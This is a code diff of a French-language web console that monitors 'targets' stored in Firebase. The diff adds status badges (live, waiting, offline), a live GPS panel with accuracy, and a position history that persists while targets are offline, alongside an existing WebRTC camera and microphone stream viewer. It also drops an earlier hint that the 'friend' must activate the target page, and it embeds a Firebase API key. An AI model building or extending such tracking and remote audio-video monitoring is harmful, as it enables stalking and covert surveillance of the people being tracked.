@@ -31,6 +31,19 @@
             width: 0%;
             transition: width 0.1s ease;
         }
+        .gps-history {
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 10px;
+        }
+        .history-item {
+            padding: 5px;
+            border-bottom: 1px solid #1f2937;
+            font-family: monospace;
+        }
+        .badge-actif { background: #10b981; color: white; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
+        .badge-attente { background: #f59e0b; color: white; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
+        .badge-horsligne { background: #6b7280; color: white; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-8">
@@ -62,13 +75,16 @@
                                 <option value="">-- Attente de cibles --</option>
                             </select>
                         </div>
-                        <div id="selectedIdDebug" class="text-[10px] text-slate-500 text-center hidden"></div>
+                        <div id="cibleStatusInfo" class="text-xs text-center p-2 rounded-lg"></div>
                     </div>
                 </div>
 
                 <div id="userInfo" class="hidden bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl space-y-4">
-                    <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📍 Coordonnées GPS</h3>
+                    <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📍 Dernière position GPS connue</h3>
                     <div id="gpsData" class="space-y-3 text-sm"></div>
+                    
+                    <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider mt-4">📜 Historique des positions</h3>
+                    <div id="gpsHistory" class="gps-history"></div>
                 </div>
 
                 <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex flex-col h-64">
@@ -122,7 +138,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getDatabase, ref, onValue, off, set, push, get, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+        import { getDatabase, ref, onValue, off, set, push, get, remove, query, limitToLast, orderByChild } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
@@ -155,12 +171,14 @@
         const userSelect = document.getElementById('userSelect');
         const userInfoDiv = document.getElementById('userInfo');
         const gpsDataDiv = document.getElementById('gpsData');
+        const gpsHistoryDiv = document.getElementById('gpsHistory');
         const connectionLog = document.getElementById('connectionLog');
         const statusDot = document.getElementById('statusDot');
         const statusText = document.getElementById('statusText');
         const metaState = document.getElementById('metaState');
         const volumeMeter = document.getElementById('volumeMeter');
         const volumeLevel = document.getElementById('volumeLevel');
+        const cibleStatusInfo = document.getElementById('cibleStatusInfo');
 
         const rtcConfig = {
             iceServers: [
@@ -187,77 +205,93 @@
             }
         }
 
-        // ===== FONCTION CORRIGÉE POUR CHARGER LES CIBLES =====
+        // ===== FONCTION POUR DÉTERMINER LE STATUT D'UNE CIBLE =====
+        function getCibleStatus(userId, webrtcData, usersData) {
+            const now = Date.now();
+            const hasOffer = webrtcData[userId]?.offer?.sdp;
+            const offerTimestamp = webrtcData[userId]?.offer?.timestamp || 0;
+            const isOfferRecent = (now - offerTimestamp) < 30000; // Offre récente (30s)
+            
+            const userLastActive = usersData[userId]?.lastActive || 0;
+            const isUserActive = (now - userLastActive) < 10000; // Utilisateur actif (10s)
+            
+            if (hasOffer && isOfferRecent && isUserActive) {
+                return { status: 'active', label: '🟢 EN DIRECT', badge: 'badge-actif', text: 'Connecté - Flux disponible' };
+            } else if (hasOffer) {
+                return { status: 'attente', label: '🟡 EN ATTENTE', badge: 'badge-attente', text: 'Offre reçue - En attente de connexion' };
+            } else {
+                return { status: 'horsligne', label: '⚫ HORS LIGNE', badge: 'badge-horsligne', text: 'Dernière position connue ci-dessous' };
+            }
+        }
+
+        // ===== CHARGER LES CIBLES AVEC STATUT CLAIR =====
         function loadUsers() {
-            // Lire dans webrtc ET dans users
             const webrtcRef = ref(database, 'webrtc');
             const usersRef = ref(database, 'users');
             
-            // Récupérer les deux sources
             Promise.all([get(webrtcRef), get(usersRef)]).then(([webrtcSnapshot, usersSnapshot]) => {
                 const webrtcData = webrtcSnapshot.val() || {};
                 const usersData = usersSnapshot.val() || {};
                 const previousSelection = userSelect.value;
-                const now = Date.now();
                 
                 const activeCibles = [];
-                const allIds = new Set();
+                const attenteCibles = [];
+                const horsLigneCibles = [];
                 
-                // 1. Ajouter les cibles de webrtc
-                Object.keys(webrtcData).forEach(userId => {
-                    const userData = webrtcData[userId];
-                    const hasOffer = userData.offer && userData.offer.sdp;
-                    const timestamp = userData.offer?.timestamp || 0;
-                    const isRecent = (now - timestamp) < 60000; // 60 secondes
+                // Analyser toutes les cibles potentielles (de webrtc et users)
+                const allIds = new Set([...Object.keys(webrtcData), ...Object.keys(usersData)]);
+                
+                allIds.forEach(userId => {
+                    const status = getCibleStatus(userId, webrtcData, usersData);
+                    const shortId = userId.length > 25 ? userId.substring(0, 20) + '...' : userId;
                     
-                    if (hasOffer && isRecent) {
-                        allIds.add(userId);
-                        activeCibles.push({ 
-                            id: userId, 
-                            type: 'webrtc',
-                            timestamp: timestamp,
-                            isActive: true
-                        });
+                    if (status.status === 'active') {
+                        activeCibles.push({ id: userId, display: `${status.label} ${shortId}`, status: status });
+                    } else if (status.status === 'attente') {
+                        attenteCibles.push({ id: userId, display: `${status.label} ${shortId}`, status: status });
+                    } else {
+                        horsLigneCibles.push({ id: userId, display: `${status.label} ${shortId}`, status: status });
                     }
                 });
                 
-                // 2. Ajouter les utilisateurs de users qui ont une offre webrtc
-                Object.keys(usersData).forEach(userId => {
-                    // Vérifier si cet utilisateur a aussi une offre webrtc
-                    if (webrtcData[userId]?.offer?.sdp) {
-                        if (!allIds.has(userId)) {
-                            allIds.add(userId);
-                            activeCibles.push({ 
-                                id: userId, 
-                                type: 'user',
-                                isActive: true
-                            });
-                        }
-                    }
-                });
-                
-                // 3. Construire la liste déroulante
+                // Construire la liste déroulante avec groupes
                 let selectHTML = '<option value="">-- Choisir une cible --</option>';
                 
                 if (activeCibles.length > 0) {
-                    selectHTML += `<optgroup label="🟢 CIBLES ACTIVES (${activeCibles.length})">`;
+                    selectHTML += `<optgroup label="🟢 EN DIRECT (${activeCibles.length}) - Flux disponible">`;
                     activeCibles.forEach(cible => {
                         const isSelected = (cible.id === previousSelection) ? 'selected' : '';
-                        // Tronquer l'ID pour l'affichage
-                        const shortId = cible.id.length > 20 ? cible.id.substring(0, 15) + '...' : cible.id;
-                        selectHTML += `<option value="${cible.id}" ${isSelected}>🟢 ${shortId} 🎤🎥</option>`;
+                        selectHTML += `<option value="${cible.id}" ${isSelected}>${cible.display}</option>`;
                     });
                     selectHTML += `</optgroup>`;
-                } else {
+                }
+                
+                if (attenteCibles.length > 0) {
+                    selectHTML += `<optgroup label="🟡 EN ATTENTE (${attenteCibles.length}) - Offre reçue">`;
+                    attenteCibles.forEach(cible => {
+                        const isSelected = (cible.id === previousSelection) ? 'selected' : '';
+                        selectHTML += `<option value="${cible.id}" ${isSelected}>${cible.display}</option>`;
+                    });
+                    selectHTML += `</optgroup>`;
+                }
+                
+                if (horsLigneCibles.length > 0) {
+                    selectHTML += `<optgroup label="⚫ HORS LIGNE (${horsLigneCibles.length}) - Dernière position connue">`;
+                    horsLigneCibles.forEach(cible => {
+                        const isSelected = (cible.id === previousSelection) ? 'selected' : '';
+                        selectHTML += `<option value="${cible.id}" ${isSelected}>${cible.display}</option>`;
+                    });
+                    selectHTML += `</optgroup>`;
+                }
+                
+                if (activeCibles.length === 0 && attenteCibles.length === 0 && horsLigneCibles.length === 0) {
                     selectHTML = '<option value="">-- Aucune cible détectée --</option>';
-                    addLog("📡 Aucune cible active. Assurez-vous que votre ami a ouvert la page cible et cliqué sur 'Activer'.");
+                    addLog("📡 Aucune cible trouvée");
+                } else {
+                    addLog(`✅ ${activeCibles.length} active(s), ${attenteCibles.length} en attente, ${horsLigneCibles.length} hors ligne`);
                 }
                 
                 userSelect.innerHTML = selectHTML;
-                
-                if (activeCibles.length > 0) {
-                    addLog(`✅ ${activeCibles.length} cible(s) active(s) détectée(s)`);
-                }
                 
             }).catch(error => {
                 console.error("Erreur chargement:", error);
@@ -265,21 +299,69 @@
             });
         }
 
+        // ===== CHARGER LE GPS AVEC HISTORIQUE (MEME HORS LIGNE) =====
         function loadUserInfo(userId) {
             if (locationListenerRef) off(locationListenerRef);
+            
+            // Dernière position
             locationListenerRef = ref(database, `users/${userId}/location`);
             onValue(locationListenerRef, (snapshot) => {
                 const location = snapshot.val();
                 if (location) {
                     userInfoDiv.style.display = 'block';
+                    const date = new Date(location.timestamp);
+                    const isRecent = (Date.now() - location.timestamp) < 60000;
+                    
                     gpsDataDiv.innerHTML = `
-                        <div><span class="text-xs text-slate-500">Latitude</span><br><span class="font-mono text-slate-200">${location.lat}</span></div>
-                        <div><span class="text-xs text-slate-500">Longitude</span><br><span class="font-mono text-slate-200">${location.lng}</span></div>
-                        <div><a href="https://www.google.com/maps?q=${location.lat},${location.lng}" target="_blank" class="block text-center py-2 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 rounded-xl text-xs">🗺️ Ouvrir dans Maps</a></div>
-                        <div class="text-right text-[10px] text-slate-500">${new Date(location.timestamp).toLocaleTimeString()}</div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-xs text-slate-500">Latitude</span>
+                            <span class="font-mono text-slate-200 font-bold">${location.lat}</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-xs text-slate-500">Longitude</span>
+                            <span class="font-mono text-slate-200 font-bold">${location.lng}</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-xs text-slate-500">Précision</span>
+                            <span class="font-mono text-slate-200">${location.accuracy || 'N/A'} m</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-xs text-slate-500">Dernière mise à jour</span>
+                            <span class="font-mono ${isRecent ? 'text-green-400' : 'text-yellow-400'}">${date.toLocaleString()}</span>
+                        </div>
+                        <div class="pt-2">
+                            <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" target="_blank" class="w-full inline-block text-center py-2 px-4 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 font-semibold rounded-xl text-xs transition-all">
+                                🗺️ Ouvrir dans Google Maps
+                            </a>
+                        </div>
                     `;
                 } else {
                     userInfoDiv.style.display = 'none';
+                }
+            });
+            
+            // Historique des positions (stocké dans Firebase)
+            const historyRef = ref(database, `users/${userId}/location_history`);
+            onValue(historyRef, (snapshot) => {
+                const history = snapshot.val();
+                if (history) {
+                    const historyList = Object.entries(history)
+                        .sort((a, b) => b[1].timestamp - a[1].timestamp)
+                        .slice(0, 10);
+                    
+                    if (historyList.length > 0) {
+                        gpsHistoryDiv.innerHTML = historyList.map(([key, loc]) => `
+                            <div class="history-item">
+                                📍 ${loc.lat.toFixed(5)}, ${loc.lng.toFixed(5)}<br>
+                                🕐 ${new Date(loc.timestamp).toLocaleString()}
+                                ${loc.accuracy ? `<br>📏 précision: ${loc.accuracy}m` : ''}
+                            </div>
+                        `).join('');
+                    } else {
+                        gpsHistoryDiv.innerHTML = '<div class="text-slate-500 text-center p-2">Aucun historique</div>';
+                    }
+                } else {
+                    gpsHistoryDiv.innerHTML = '<div class="text-slate-500 text-center p-2">Aucun historique</div>';
                 }
             });
         }
@@ -315,7 +397,7 @@
         async function connectToUser() {
             currentUserId = userSelect.value;
             
-            addLog(`🔍 Tentative de connexion - ID sélectionné: "${currentUserId}"`);
+            addLog(`🔍 Tentative de connexion - ID: "${currentUserId}"`);
             
             if (!currentUserId || currentUserId === "") {
                 addLog("⚠️ Veuillez sélectionner une cible dans la liste");
@@ -529,17 +611,22 @@
         fullscreenBtn.addEventListener('click', toggleFullscreen);
         
         userSelect.addEventListener('change', () => {
+            const selectedId = userSelect.value;
+            if (selectedId) {
+                loadUserInfo(selectedId);
+                cibleStatusInfo.innerHTML = '';
+            }
             if (peerConnection) {
                 disconnect();
             }
         });
         
-        // Rafraîchir la liste toutes les 3 secondes
         loadUsers();
-        setInterval(loadUsers, 3000);
+        setInterval(loadUsers, 5000);
         
-        addLog("✅ Console prête - En attente de cibles...");
-        addLog("💡 Votre ami doit ouvrir la page cible et cliquer sur 'Activer'");
+        addLog("✅ Console prête");
+        addLog("💡 Les cibles sont classées: 🟢 EN DIRECT | 🟡 EN ATTENTE | ⚫ HORS LIGNE");
+        addLog("📍 Les positions GPS sont conservées même hors ligne");
     </script>
 </body>
 </html>
